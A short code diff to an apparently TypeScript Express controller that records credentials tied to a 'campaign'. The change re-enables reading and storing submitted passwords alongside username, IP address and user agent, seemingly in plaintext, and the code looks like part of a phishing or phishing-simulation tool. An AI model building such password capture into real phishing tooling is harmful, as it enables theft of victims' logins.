@@ -4,11 +4,10 @@ import { Credential } from '../models/credential.model';
 export const credentialController = {
   async create(req: Request, res: Response) {
     try {
-      const { username, campaignId } = req.body;
-      //const { username, password, campaignId } = req.body;
+      const { username, password, campaignId } = req.body;
       const credential = new Credential({
         username,
-        //password,
+        password,
         ipAddress: req.ip,
         userAgent: req.headers['user-agent'],
         campaign: campaignId
